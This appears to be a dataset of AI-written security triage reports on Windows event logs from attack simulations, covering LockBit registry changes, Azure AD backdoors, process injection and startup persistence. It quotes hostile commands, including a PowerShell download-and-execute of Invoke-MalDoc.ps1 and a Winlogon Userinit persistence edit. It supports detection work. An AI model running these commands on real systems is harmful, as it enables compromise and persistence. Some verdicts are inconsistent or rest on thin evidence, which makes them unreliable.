   - Numerous processes were observed running under `NT AUTHORITY\SYSTEM` which is typical, but when viewed in the light of potentially circumventing security measures or performing unauthorized actions, this calls for further analysis.

### Conclusion:

Given the evidence from the logs, there are clear indications of potentially malicious activity. In particular, the unauthorized PowerShell operations coupled with suspicious registry changes and time manipulations strongly suggest malicious intent. 

### Resolution:

**MALICIOUS** - The combination of registry manipulation, privilege escalation, and potential time modifications signals a probable compromise of the host.

### Recommended Actions:

1. **Immediate Isolation:** Isolate `Server002` from the network to prevent further potential spread or action by adversaries.
2. **In-Depth Malware Scan:** Conduct a comprehensive malware scan on `Server002` to detect and remove any installed payloads.
3. **Forensic Deep Dive:** Perform a forensic analysis on the server to determine the extent of the compromise and collect evidence.
4. **Review Audit Policies:** Update and review audit policies to ensure time changes and privilege escalations are closely monitored in the future.
5. **Patch and Update:** Ensure the latest security patches are applied across all systems and applications to mitigate vulnerabilities.
6. **Security Awareness Training:** Reinforce security awareness and operational procedures with all administrators and users to heighten detection and reporting of unusual activities."
LockBit Black - Modify Group policy settings -Powershell,"Based on the analysis of the provided Windows event logs, here are the main observations related to suspicious or anomalous behaviors and any indicators of potential compromise:

### Observations:

1. **Process Activity**:
   - **Wevtutil.exe Execution by `admin_test`:** The wevtutil.exe tool, which is used for managing Windows Event logs, appears multiple times in the logs with the user `SERVER002\\admin_test`. Although wevtutil.exe is a legitimate Windows tool, its frequent execution can be indicative of either routine administrative tasks or potential log tampering or information gathering activity if done unexpectedly.
   - **Frequent Execution of Powershell and Registry Modifications:** There is evidence of PowerShell usage to modify Windows registry keys related to group policy and SmartScreen settings. This could indicate attempts to weaken defenses or bypass security mechanisms.
   
2. **Time Manipulation**:
   - **Time Change Events:** There are Windows Kernel-General and Security-Auditing events indicating that the system time was altered. The change from `2024-10-26 19:04:42.5876563` to `2024-10-26 19:05:07.9038391` is noted. Altering the system's clock can be used to manipulate logs by attackers to hide traces of malicious activity.

3. **User and Privilege Activity**:
   - **Multiple User Enumeration Events:** Events for user account enumeration (`EventID 4798`) were logged, listing detailed information about local user accounts. This could suggest reconnaissance activity on the part of an attacker.

4. **Service and Process Events**:
   - **UsoClient.exe and associated Processes:** UsoClient and related processes might execute during regular Windows update activities. These logged operations seem consistent with regular update checks and activities.

5. **Logon Events**:
   - **SYSTEM Account Logons:** A series of logon events for the `SYSTEM` account (EventID 4624) are present, which could be normal, depending on scheduled tasks and system operations.

### Analysis Conclusion:

While most of the activities logged (such as process executions under NT AUTHORITY\SYSTEM and system updates) are consistent with standard operations in a Windows environment, the combination of PowerShell usage for registry manipulation, repeated execution of wevtutil.exe by a seemingly non-standard administrative user (`admin_test`), user account enumeration, and system time changes can be seen as red flags. These activities, especially if not authorized or expected, suggest potential malicious behavior or at least warrant further investigation.

### Final Assessment: **SUSPICIOUS**

**Guidance and Next Steps:**
- **Investigate PowerShell Usage:** Determine the intent and context of the PowerShell scripts executed, especially those modifying registry values.
- **Review System Logs and Account Activities:** Check for any unauthorized access or deviations in regular administrative routines, particularly regarding user `admin_test`.
- **Verify Time Changes:** Ensure system time changes were intentional and coordinated with legitimate administrative tasks.
- **Monitor for Future Anomalies:** Implement tighter monitoring on the host to identify any subsequent suspicious activities.
- **Audit Security Controls:** Verify that system security controls such as antivirus, SmartScreen, and group policies are correctly configured and operating as expected.

This analysis highlights potential areas of concern that require further examination to rule out possible compromises or security policy violations."
Azure AD Application Hijacking - App Registration,"Upon examining the provided logs, there are several artifacts that indicate potentially malicious activity. Here’s a breakdown of the suspicious observations:

1. **PowerShell Activity:**
   - The logs indicate the execution of a complex PowerShell script (Event Record IDs: 1165, 1167) that involves connecting to Azure AD, importing a module, and generating a self-signed certificate. This is potentially suspicious, particularly the use of a custom certificate and application credential modifications (`New-AzureADApplicationKeyCredential`). This could signify unauthorized attempts to access and manipulate Azure Active Directory resources.

2. **Credentials Utilization:**
   - The script appears to create a credential object using `ConvertTo-SecureString` and `New-Object System.Management.Automation.PSCredential`. While this could be routine, in conjunction with the subsequent actions, it suggests malicious behavior aiming to establish unauthorized access.

3. **Application Key Manipulation:**
   - The use of `New-AzureADApplicationKeyCredential` indicates an effort to add credentials to an Azure AD application, which could be an attempt to persist access or hijack application permissions in Azure AD.

4. **Command-line Execution Context and Certificate Details:**
   - The command line executed within PowerShell includes checks and operations related to Azure AD applications, along with sensitive operations such as creating self-signed certificates and credential expirations. This behavior is atypical for routine administrative tasks and aligns more closely with post-exploitation activities.

5. **Logon Events (Security Log Analysis):**
   - Event ID 4672 indicates that the SYSTEM account acquired high privileges, which can be normal. Still, in context with other suspicious activities, it warrants concern about potential privilege escalation or abuse.

Based on these observations, the consolidated assessment of the situation is:

- **Resolution: MALICIOUS.**

**Guidance and Way Forward:**

1. **Immediate Response:**
   - Isolate the affected host (`Server002`) to prevent further unauthorized access.
   - Revoke any Azure AD credentials or application modifications if feasible to block potential persistence mechanisms.

2. **Thorough Investigation:**
   - Conduct a full forensic investigation of `Server002` to determine the extent of the breach, including analyzing network traffic and further exploring authentication logs.
   - Examine Azure AD audit logs for unauthorized changes to applications or credentials.

3. **Security Hardening and Monitoring:**
   - Implement stricter PowerShell execution policies to limit unapproved scripts.
   - Immediately initiate continuous monitoring on similar infrastructure to catch any indicators of compromise early.

4. **User Awareness and Training:**
   - Ensure periodic training and awareness for administrators on the detection of suspicious activities and the importance of following best security practices."
Add Federation to Azure AD,"Upon reviewing the provided Windows event logs, here are the observations and findings relating to any suspicious or anomalous behavior:

### Analyzed Events and Findings:

1. **Sysmon Events**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` activities were noted. These processes are standard for event log management and console host operations respectively. However, the sheer volume and simultaneous execution alongside other processes were concerning.
   
2. **Process Execution and Modules**:
   - A critical finding is the execution of `powershell.exe` with a complex command line involving AzureAD and AADInternals modules. This script attempts to establish a connection to Azure AD and convert a domain to federated authentication using what appears to be unauthorized credentials (""bruce.wayne@contosocloud.com"").
   - The command involves creating a backdoor with `ConvertTo-AADIntBackdoor`, indicating potentially malicious intent to manipulate domain trust settings in Azure AD, which is highly suspicious.

3. **Command Line Analysis**:
   - The specific usage of `ConvertTo-AADIntBackdoor` is particularly alarming as it suggests an attempt to backdoor Azure Active Directory. This is characteristic of a potential advanced persistent threat (APT) attack methodology.

4. **Integrity and User**:
   - The user executing these commands (`SERVER002\\admin_test`) implies administrative privileges might have been exploited for malicious usage, given the high integrity level.

### Assessment:

The events surrounding the execution of PowerShell command along with modules tied to Azure Active Directory manipulation and configuration are highly indicative of malicious activity. The actions demonstrate unauthorized attempts to create a persistence mechanism (`backdoor`) within an organization's cloud infrastructure.

### Resolution:

- **Resolution**: **MALICIOUS**

### Recommendations:

1. **Immediate Actions**:
   - Isolate the affected host `Server002` from the network to prevent any further unauthorized access or spread.
   - Conduct a comprehensive review of all administrative user activities, especially focusing on the credentials of `admin_test`.

2. **Forensic Investigation**:
   - Analyze the PowerShell logs further to understand the full scope and intention of the script execution.
   - Investigate other potential compromised accounts and establish whether `bruce.wayne@contosocloud.com` is an active, authorized user or a spoofed identity.

3. **Mitigation Steps**:
   - Change all administrative passwords and enforce multifactor authentication (MFA) for all accounts with elevated privileges.
   - Audit Azure AD logs and settings for any unauthorized changes or configurations made recently.

4. **Long-term Measures**:
   - Strengthen monitoring by setting up alerts for suspicious PowerShell activity and changes in Azure AD.
   - Conduct security awareness training, focusing on recognizing and responding to phishing and credential-based attacks.

These steps aim to address the immediate threat while strengthening defenses against future attacks."
Shellcode execution via VBA,"Upon reviewing the provided logs, there are several factors that suggest potentially malicious activity. Here's a detailed analysis of the suspicious behavior noted:

1. **Unusual PowerShell Activity**: 
   - The logs indicate the execution of PowerShell scripts that appear to download and execute code from a remote repository. Specifically, `Invoke-MalDoc` is mentioned which suggests the execution of a potentially malicious macro document. The command-line argument used in PowerShell is attempting to download and run scripts from `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`.
   - The usage of `IEX` (Invoke-Expression) in this context is typically suspicious, as it can be used to execute arbitrary strings or scripts which can be potentially harmful.

2. **Frequent Usage of System Utilities**:
   - Several entries show commands being executed from familiar system tools like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. The occurrence of these utilities themselves isn't inherently suspicious, but when coupled with suspicious PowerShell activity, they could indicate reconnaissance or attempts to clear logs or gather system information by an attacker.

3. **High Integrity Level Execution**:
   - The PowerShell scripts and system utilities are running at a High Integrity Level, indicating they have elevated privileges. This makes any script execution more dangerous as it could potentially lead to further compromise of the system or facilitate privilege escalation attempts.

4. **Sequence of Execution and Source User**:
   - The sequences are executed by a user tagged as `SERVER002\admin_test`. If this user is unusual or unexpected, it may indicate the use of a compromised account.

**Assessment**:
The execution pattern strongly suggests that these logs are indicative of a malicious activity. The specific use of a web-borne script hosted on GitHub that aligns with file and macro execution hints at an objective of initial access or execution of second-stage payloads.

### Resolution: MALICIOUS

**Guidance on How to Proceed**:
- **Immediate Action**:
  - Isolate the affected system (Server002) from the network to prevent further potential spread of malicious software or exfiltration of data.
  - Review and secure the 'admin_test' account and reset its credentials.
  - Inspect the machine for any suspicious persistence mechanisms or additional payloads that might have been dropped or executed.

- **Further Investigation**:
  - Conduct a full memory analysis and disk forensics on Server002 to identify any additional artifacts or second-stage payloads as well as any lateral movement.
  - Analyze network logs for any outgoing connections to suspicious hosts or IPs and apply blocks where necessary.

- **Preventive Measures**:
  - Update antivirus and endpoint detection solutions across the environment, and consider implementing a stricter monitoring and alerting on PowerShell activity.
  - Educate and train users on phishing and malicious macro documents to prevent similar incidents in the future. 

Ensure that a comprehensive incident report is documented and necessary regulatory bodies or partners (if affected) are notified according to compliance requirements."
Process Injection via C#,"### Detailed Analysis of Windows Event Logs

#### Unusual Process Executions and Command-Line Arguments:

1. **PowerShell Execution:**
   - **Process:** `powershell.exe`
   - **User:** `SERVER002\admin_test`
   - **Comment:** While PowerShell is a normal and commonly used tool, its execution by administrative accounts can be a vector for scripting attacks or unauthorized data access.

2. **Suspicious Command Execution:**
   - **Command:** `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\data.exe""`
   - **User:** `SERVER002\admin_test`
   - **Comment:** Execution of an executable from a temporary directory could be indicative of malicious activity. The path `C:\Users\ADMIN_~1\AppData\Local\Temp` is often used by malware for staging.

3. **Event Log Clearing Utilities:**

   - **User:** `SERVER002\admin_test`
   - **Comment:** Frequent usage of `wevtutil.exe` by an administrative user, especially in short time spans, can be indicative of attempts to clear event logs to hide tracks.

#### Time Manipulation:

- **Details:**
  - **Old Time:** `2024-10-22 18:16:12.1088799`
  - **New Time:** `2024-10-22 18:15:43.4382865`
  - **Process:** `C:\Windows\System32\svchost.exe`
  - **Comment:** The time change event triggered by `svchost.exe` suggests possible tampering with system time, potentially to evade detection or align logs with malicious activities.

#### Network Information Investigations:

- **Process:** `whoami.exe`, `hostname.exe`
- **User:** `SERVER002\admin_test`
- **Comment:** Usage of `hostname.exe` and `whoami.exe` might indicate enumeration activity. Such activities help an attacker understand the environment before launching further attacks.

#### General Observations:

- The `SERVER002\admin_test` account is involved in various processes and command-line executions that seem unnecessary and potentially harmful when aggregated.
- No clear indication of privilege escalation was found, but the frequent access and utilization of system commands and utilities could hint at the exploration of system capabilities by an attacker.
- System log displays events indicative of time manipulation, which can be used to obscure activities.

### Assessment and Conclusion:

Based on the analysis of unexpected `PowerShell` usage, suspicious command execution involving temporary directories, repeated use of event log utilities like `wevtutil.exe`, and system time manipulation events, there is a reasonable ground to consider this activity beyond normal administrative operations.

### Resolution: **SUSPICIOUS**

**Actionable Guidance:**
- **Further Investigate:** Begin a deeper investigation into the `admin_test` account, especially focusing on actions around the timestamps identified.
- **Network Exposure:** Examine network traffic from `Server002` to identify any unusual outbound connections or data exfiltration.
- **System Time Check:** Investigate logs for any correlation with external triggers that might indicate an online threat actor manipulation attempt.
- **File Integrity Monitoring:** Check integrity scores for executables, specifically those initiated from the temp path.
- **Security Protocol Assessment:** Ensure the security protocols are up-to-date for detecting any potential threats internally.

Immediate response should aim to verify the authenticity of the identified anomalies and mitigate any potential risks by monitoring the server's ongoing activities closely."
Azure AD - adding permission to application,"**Detailed Analysis of the Logs**

Upon reviewing the provided Sysmon and PowerShell logs, several activities and behaviors appear noteworthy:

1. **Powershell Activity:**
   - There are multiple instances of PowerShell execution. Notably, two separate processes involving PowerShell are using potentially sensitive command-line operations:
     - The process ID 4944 with PowerShell seems benign since it typically launches `conhost.exe` and `wevtutil.exe`, which are standard Windows executable tools. However, the PowerShell process with the ID 5068 appears significantly more suspicious, as it runs a complex script involving AzureAD, manipulating credentials, creating AzureAD applications, and configuring permissions using cmdlets such as `New-AzureADApplication` and `New-AzureADServiceAppRoleAssignment`.
     - The script includes converting a string into a secure string and using PSCredential objects, which could potentially be used to steal or abuse Azure identity credentials.

2. **Process Execution:**
   - Following the PowerShell session, a variety of system utility tools (`conhost.exe`, `whoami.exe`, etc.) are spawned, which seem consistent with legitimate activity; however, their synergy with the risky PowerShell session isn't typical.
   - Activities involving processes such as `HOSTNAME.EXE` and `whoami.exe` are standard and often used for system information gathering.

3. **Windows Event Log Utility:**
   - Instances of `wevtutil.exe` are shown repeatedly executed alongside the PowerShell sessions—which is likely related to manipulating or gathering event logs. This usage might indicate potential log clearing or querying activity, suggesting an attempt to hide certain activities.

4. **Scheduled Activity or Updates:**
   - Activities involving Microsoft Edge Update (e.g., `MicrosoftEdge_X64_130.0.2849.52_129.0.2792.89.exe`, `setup.exe`, etc.) appear to be legitimate as part of scheduled or triggered software updates, launched by `svchost.exe` under the SYSTEM account, which aligns with normal update processes.

**Assessment of the Situation:**

The combination of AzureAD manipulation via PowerShell, coupled with frequent use of `wevtutil.exe`, points towards potentially suspicious behavior. The use of AzureAD-specific PowerShell cmdlets, particularly those that manipulate permissions and access applications, is not typically part of standard administrative tasks unless there's an ongoing configuration change or deployment that aligns with these actions.

**Resolution: SUSPICIOUS**

Based on the identified behavior, these logs should be categorized as ""SUSPICIOUS."" Specifically, the PowerShell operations that interface deeply with Azure Active Directory without clear prior authorization or business rationale present a possible security risk. They may either be an unverified administrative activity or indicative of credential theft/exploitation.

**Guidance on How to Proceed:**

1. **Validate Activity with Admins:**
   - Engage directly with administrators or personnel who have access to Azure AD in this environment. Confirm if there were planned activities or changes that align with this PowerShell operation.

2. **Review AzureAD Logs:**
   - Check the AzureAD audit and sign-in logs for any unusual or unauthorized activities that might coincide with the time these scripts were executed.

3. **Enhanced Monitoring:**
   - Implement enhanced PowerShell logging and monitoring on `Server002`. Ensure that 'Script Block Logging' and 'Module Logging' are active to capture more detailed activity in potential future incidents.

4. **Consider an Incident Response:**
   - Depending on any additional findings from further investigation, you may need to treat this as a potential security incident, potentially disconnecting or isolating the host, performing a more thorough forensic analysis, or applying remedial measures to revoke compromised credentials."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"Upon analyzing the provided Windows event logs, several details stand out that warrant closer inspection:

1. **PowerShell Execution**: Multiple logs in the Windows PowerShell log show the execution of `powershell.exe` with a command pointing to a Temp directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\EtwpCreateEtwThread.exe -debug`). While `powershell.exe` is a legitimate application, execution from a Temp directory is often suspicious as this is a common tactic used by attackers to execute malicious payloads. The executable `EtwpCreateEtwThread.exe` is not a known or common Windows executable, and its purpose is unclear from the logs.

2. **Sysmon Activity**: There are numerous process creations related to standard utilities like `whoami.exe`, `hostname.exe`, and `conhost.exe`. These executions might typically be benign, but given the context of PowerShell being used to execute potentially suspicious scripts, they might need further review to ensure they do not form part of a broader malicious activity.

3. **Security Auditing**: The security logs show successful logins with elevated privileges (`SeDebugPrivilege`, among others). The presence of these privileges, especially `SeDebugPrivilege`, which allows for inspecting and modifying the memory of other processes, can be of concern if not expected for the user `admin_test`.

4. **Network and Logon Information**: The logs note NTLM authentication. While this is a common protocol, it's worth verifying if the originating IP (`fe80::866a:d1f8:8d06:7bc`) is expected or if it correlates with known trusted sources.

### Assessment and Resolution:
- **Assessment**: The combination of PowerShell executing a suspicious script from a Temp directory, the presence of high-level privileges, and the unclear context of this activity indicate potential risks. While no outright malicious activity is conclusively identified, the execution patterns are abnormal and could suggest preparation for further malicious actions.
- **Resolution**: **SUSPICIOUS** - The logs contain suspicious activities that merit further investigation, such as reviewing the questionable PowerShell script's content, why it's in a Temp directory, and verifying the legitimacy of the admin_test's recent activities, especially concerning high privileges and logins.

### Guidance on How to Proceed:
1. **Investigate the Script**: Analyze the contents and the origin of `EtwpCreateEtwThread.exe`.
2. **Verify User Activities**: Determine if user `admin_test` should have permissions for what is seen. Check recent activity for any anomalies.
3. **Check for Persistence Mechanisms**: Look for changes in registry or filesystem that could indicate persistence setup.
4. **Network Activity**: Monitor network traffic from the server for unusual connections, particularly linked with entities interacting via IPv6.
5. **Evaluate Privilege Use**: If `SeDebugPrivilege` was not required, verify system policies and audit similar privilege adjustments."
Domain Password Policy Check: No Uppercase Character in Password,"After analyzing the provided Windows event logs for potential indicators of malicious activity, here are my findings:

### PowerShell Logs:
1. **Repeated PowerShell Activity**:
   - There are multiple PowerShell events that suggest a script was executed, involving operations like checking a credential file, managing Active Directory account passwords, and storing credentials in a file. The script attempts to change a user's password and handle exceptions related to invalid password conditions. Although these operations are notably powerful, automating credential changes or management is common in administrative or organizational scripts. However, it being initiated without further context might raise a concern.

2. **Credential Management Within Scripts**:
   - The script handles sensitive credential information and checks if the password ""lower-long-special-333"" is the same as a saved one. This activity signifies that the password is being managed but could also imply potential credential mishandling if not secured properly.

### Security Logs:
1. **CallerProcess Using CompatTelRunner.exe**:
   - CompatTelRunner.exe, associated with Windows telemetry, is showing activity accessing several user/group entities. While this is a legitimate Windows component, its misuse could be a concern. The fact that it is associated with system processes in these logs suggests that it could be involved in unauthorized activity, possibly exploiting its legitimate nature to remain undetected.
   
2. **Privilege Elevation**:
   - There are events indicating privilege assignment (Event ID 4672) involving powerful rights such as `SeDebugPrivilege`. This could point to a potential privilege escalation attempt if unaccounted for, particularly if these privileges are elevated inappropriately.

### Sysmon Logs:
1. **Processes Executed by `admin_test`**:
   - The logs indicate multiple legitimate Windows utilities (like `powershell.exe`, `whoami.exe`, `wevtutil.exe`) executed by a user `SERVER002\admin_test`. The command lines provided suggest common investigative or operational use cases like checking credentials or reviewing event logs.
   
2. **Medium to High Integrity Levels**:
   - Processes running at high integrity levels suggest administrative execution, aligning with the operations conducted, yet if `admin_test` is not typically assigned such tasks, it can represent unusual behavior.

### Overall Analysis:
- **Suspicious Activity**: The scripts handling credentials, unusual telemetry process activities, coupled with the Sysmon evidence indicating a user `admin_test` performing operations at elevated privileges, suggest potential misuse or exploitation patterns. These activities demand a deeper investigation to rule out insider threats or external inappropriate access exploitations.

### Conclusion:
- **Resolution**: **SUSPICIOUS** - While there is no definitive evidence of malicious activity, the observed patterns suggest possible atypical behavior that requires further scrutiny to ensure there's no compromise. Further investigation should confirm user intent, script authenticity, the nature of `CompatTelRunner.exe` actions, and legitimacy of privileged access.

### Recommendations:
- **Verify the legitimacy of the PowerShell scripts** involved in credential management.
- **Ensure `admin_test` user actions** are authorized and consistent with expected roles.
- **Investigate the usage of `CompatTelRunner.exe`** for any unauthorized telemetry activity.
- **Audit privilege assignments** and recent changes for potential unauthorized escalations."

Upon thorough review of the provided Windows event logs from the Application, System, Security, Sysmon, and Windows PowerShell logs, I have identified the following findings:

#### Application Log
1. **Microsoft-Windows-Security-SPP (EventID: 16384)**: This event indicates a standard operation of the Software Protection Platform Service, which is benign unless there are unexpected failures or errors. None noted.
   
2. **Edge Update Service Events**: There are entries indicating the Microsoft Edge Update service stopped. This is seen twice in quick succession and might be part of normal update procedures for the software.

#### System Log
1. **Group Policy and Kernel General Time Events**: The entries are associated with typical system operations related to group policies and system time adjustments. There are no abnormal or unexpected changes noted.
   
2. **Time Service Event (EventID: 35)**: This refers to the time synchronization process with a time source. Again, no unusual discrepancies.

#### Security Log
1. **Time Change Events (EventID: 4616)**: These events document a change in the system time and appear as standard log activity with no indication of unauthorized manipulation.

#### Sysmon Log
1. **Process Creation and Event Logs Related to Wevtutil and Conhost**: Multiple instances of `wevtutil.exe` and `conhost.exe` being executed are captured. The `wevtutil.exe` is used for managing event logs, and `conhost.exe` is a standard console host process.
   
2. **Execution of Cmd.exe with SecEdit**: The `cmd.exe` process executing `SecEdit` was noted with arguments involving `/import` and `/configure` operations. While it might represent legitimate system configuration changes, it could be potentially suspicious if these actions were not expected or authorized.

3. **Microsoft Edge Update Processes**: Numerous events related to the execution and updating of Microsoft Edge were logged. The logs appear to be legitimate updates to Microsoft Edge components. 
   
4. **Execution of `svc` and `comregistershell` commands by EdgeUpdate**: These cannot be classified as outright malicious, as they align with legitimate behaviour for updating components unless context indicates otherwise.

### Assessment and Resolution
Based on this analysis:

- **BENIGN**: Most logs indicate normal system operations and the use of known tools like EdgeUpdate and SecEdit. There are no clear indicators of compromise such as privilege escalations, malware execution, or unauthorized network connections.

- **SUSPICIOUS**: The reoccurring execution of `cmd.exe` with `SecEdit` could be suspicious if these actions weren't part of expected maintenance. It is recommended to verify the legitimacy of these processes with the IT team or system administrators to confirm if they align with expected changes or configurations.

### Guidance on Proceeding
- **Verification**: Confirm with system administrators or security policy managers that the execution of `SecEdit` and associated system modifications were expected or authorized during the time of the event logs.
- **Monitor**: Continue to monitor for irregular patterns, especially regarding unexpected changes to system configurations or unauthorized software installations that could indicate a potential persistence method used by an attacker.
- **Audit**: Regularly audit system updates and changes implemented to ensure they match with authorized change requests.
  
Taking these steps can help ensure that any potentially unauthorized configuration changes are identified and mitigated promptly. Based on the logs provided, further investigation isn't deemed immediately critical unless new information or alerts contradicts the current understanding."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"### Detailed Analysis

Upon reviewing the provided Windows event logs, the sequence of events primarily comprises process creation and termination activities sourced from Sysmon, and related logging in PowerShell, Security, Application, and System channels. Notably, several events stand out for closer scrutiny:

1. **Edge Updation and Execution**:
   - The logs consistently show executions related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and its components). This in itself isn't inherently suspicious, as these processes are part of the legitimate Microsoft Edge update mechanism. The command lines `/regserver`, `/svc`, and `/c` are standard components of Microsoft Edge service operations.

2. **Windows Command Executions from Uncommon Locations**:
   - Multiple instances of `whoami.exe`, `hostname.exe`, and PowerShell executions are observed. While these are native Windows utilities, their repeated execution and overlapping time frames require attention if originating from unexpected contexts. However, a direct association with malicious activity is not immediately evident from the context provided unless more background information suggests otherwise.

3. **Suspicious PowerShell Activity**:
   - The PowerShell command seems to modify the registry's `StubPath` value to execute `calc.exe`, with the inclusion of `runonce.exe /AlternateShellStartup`. This behavior manipulates the Windows startup registry keys to trigger an application upon user login, which can be exploited for persistence in malicious campaigns. Such modification requires deeper investigation.

4. **Privilege Context**:
   - Numerous processes, including the suspicious behavior, execute with high integrity levels and SYSTEM privileges, reflecting significant potential for impact if exploited maliciously.

### Assessment

The provided logs reveal an unusual registry modification through PowerShell, which adjusts the Windows registry for startup behavior, typical in setups for persistence mechanisms by malware. Despite the lack of explicit malware indicators such as known malicious hashes or network activity within these logs, the alteration of registry paths to execute a non-mission-critical application (calc.exe) necessitates further inquiry.

### Threats and Risks Identified

- **Registry Modification for Persistence**: The modification of the Windows registry for persistence is a red flag. If done unintentionally, it can open paths for malware.
- **Execution as NT AUTHORITY\SYSTEM**: Processes running under such high-level privileges warrant attention due to their potential for full system control.

### Guidance on How to Proceed

- **Investigate the PowerShell Command**: Further examination of the origin, intent, and context behind the PowerShell script execution should be prioritized. Determine if the registry changes were authorized or part of a scheduled task that misfired.
- **Audit User Activity**: Verify any recent user activities that might correlate with this PowerShell execution. Contextual user activity can offer clues on whether this was a benign script or potential automated attack.
- **Continuous Monitoring**: Set alerts for similar behavior in the future, especially if uncommon command line arguments are utilized or critical system paths like `HKLM\SOFTWARE\Microsoft\Active Setup` are altered.
- **Threat Intelligence Correlation**: Correlate these events with known IOCs from threat intelligence feeds to identify if similar patterns have been observed in other attacks.

### Resolution

Given the context and the potential misuse of PowerShell for registry alterations, the resolution for this analysis is **SUSPICIOUS**. Due to the possibility of either benign misconfigurations or malicious activities targeting persistence, it requires further investigation to conclusively determine the nature of these events."
Process Injection with Go using CreateThread WinAPI (Natively),"After carefully reviewing the provided logs from various Windows event sources, I have compiled a detailed analysis for possible indicators of suspicious or anomalous behavior.

1. **Security Log (EventID 4616):**
   - The logs indicate a change in system time. System time changes could be benign, but in certain contexts, they might be used to evade time-based security measures or logs. The process responsible ('svchost.exe'), typically a legitimate Windows process, executed the time change. However, changes back and forth in a small time period is unusual and might merit further inspection to understand if this was intentional or caused by a misconfigured system.

2. **Sysmon Log (EventID 5 and 1):**
   - Processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `WindowsPowerShell.exe` are executed. The execution of PowerShell with a modification to run `CreateThreadNative.exe` from a Temp directory at 17:54:29 is particularly suspicious. The `CreateThreadNative.exe` in the Temp path could indicate the use of a script or exploit attempting to escalate privileges or execute unauthorized tasks.
   - PowerShell scripting with a file from the Temp folder (specifically `CreateThreadNative.exe -debug`) often indicates a higher risk of malicious activity. This event is concerning and typically warrants further inspection.

3. **Windows PowerShell Log (EventID 600, 400, 403):**
   - PowerShell is employed to run suspicious executable `CreateThreadNative.exe`, reinforcing concerns from the Sysmon logs. The PowerShell engine starting with such suspicious host application details should be examined closely.

4. **System Log (EventID 1, 24, 35):**
   - Time synchronization and time change logs support the timeline indicated in the Security Logs. This could correlate with the unusual process timing, but appears as a result of typical system processes, albeit with suspicious timing.

5. **Application Log (EventID 16384 SPP):**
   - The log from the Software Protection Platform Service does not provide direct evidence of malicious behavior.

**Conclusion:**

- **SUSPICIOUS**: The presence and execution of `CreateThreadNative.exe` via PowerShell with debugging arguments from a temporary directory is notably suspicious. It could imply the presence of malicious software or scripts attempting to conceal their activities or execute hidden commands.
- There's also potential misuse of system utilities like PowerShell, which is often a hallmark of malicious attempts on Windows systems, especially where the source file resides outside the standard application directories.

**Recommendations:**

1. **Immediate actions:**
   - Isolate the affected system to prevent any potential propagation of malicious activity.
   - Obtain the suspicious executable and script for detailed forensic analysis.
   
2. **Further Investigation:**
   - Review system integrity and user account activity around the time these events took place.
   - Examine network activity from the host for connections to unexpected domains or IP addresses related to known malicious infrastructures.

3. **Preventive Measures:**
   - Strengthen PowerShell logging and implement enterprise restrictions on script execution policies.
   - Educate end-users on the risks of executing unknown scripts and files, emphasizing security awareness.

The investigation should continue to determine the intent and extent of suspicious activities observed and to rule out false positives."
Add Executable Shortcut Link to User Startup Folder,"Upon reviewing the provided Windows event logs, I have identified the following points of interest:

1. **PowerShell Activity:**
   - **Event Record IDs 1043-1048:** These events illustrate a PowerShell script execution that creates a shortcut to `calc.exe` in the Startup folder (`$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk`). This action is suspicious as it attempts to set up persistence by ensuring `calc.exe` runs every time the user logs on, a common technique used by malware for persistence.

2. **Sysmon Logs:**
   - **Event Record ID 17979:** The event shows the execution of PowerShell with a command that corresponds with the suspicious activity of creating a shortcut for `calc.exe` in the Startup folder. This reinforces the likelihood of the suspicious PowerShell script being part of potentially malicious activity. 
   - **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** Multiple executions of `wevtutil.exe` and `conhost.exe` were observed. While these can be legitimate system processes, repeated and rapid execution in conjunction with the other suspicious activity might indicate malicious use for log clearing or system modifications.

3. **Microsoft Edge and Update Activities:**
   - Numerous entries related to Microsoft Edge Update processes are present. These entries mostly appear to conduct legitimate update processes, noted by various updates and processes running under `NT AUTHORITY\SYSTEM`. These do not explicitly appear malicious but could be a channel used for malicious activity if not properly validated.

4. **Security and System Logs:**
   - The application log entry indicating Windows Defender is on (`SECURITY_PRODUCT_STATE_ON`) suggests that antivirus protection is enabled, although it does not rule out the potential for malicious activities bypassing it.
   - The system log entries show typical update activities for Microsoft Defender Antivirus, which appears consistent with regular system updates.

**Assessment:**
- The creation of a startup shortcut for `calc.exe` using a PowerShell script to maintain persistence is particularly noteworthy and leans toward suspicious or potentially malicious activity.
- While other system activities logged could potentially serve benign reasons (e.g., system updates, legitimate system configuration actions), the PowerShell script's intent and its execution context raise concern.

**Resolution: SUSPICIOUS**

**Guidance:**
1. **Further Analysis of PowerShell Scripts:**
   - Conduct a full review of PowerShell activity on the host to identify any other potentially malicious scripts or commands.
   - Investigate and validate the intent behind the `calc.exe` shortcut creation. Consider scanning the `calc.exe` for signs of tampering.

2. **Examine Persistency Mechanisms:**
   - Search for and nullify any unauthorized persistence mechanisms that could impact the host, especially in the Windows Startup configurations.

3. **Review System Integrity:**
   - Perform an integrity check of critical system files and registry entries for unauthorized changes.
   - Navigate through other similar PowerShell commands on the network that might indicate a targeted attack strategy.

4. **Broader Threat Detection:**
   - Implement or update heuristic-based detection methods for suspicious script executions across the system and utilize endpoint detection and response (EDR) tools effectively.

5. **Increase Monitoring:**
    - Enhance monitoring of PowerShell use, log management tools like `wevtutil.exe`, and other system utilities commonly utilized in attacks.

Further investigation is necessary to confirm any malicious intent and mitigate potential threats effectively."
Winlogon HKLM Userinit Key Persistence - PowerShell,"After thoroughly reviewing the provided logs, the following analysis details the findings:

### **Suspicious or Anomalous Behavior:**

1. **PowerShell Execution:**
   - The logs show the execution of a PowerShell command that modifies a registry entry in the following manner:
     ```
     powershell.exe & {Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force}
     ```
   - This command modifies the Userinit registry key, which is executed during user login. This modification can be indicative of persistence techniques used by malware to maintain access on a system.

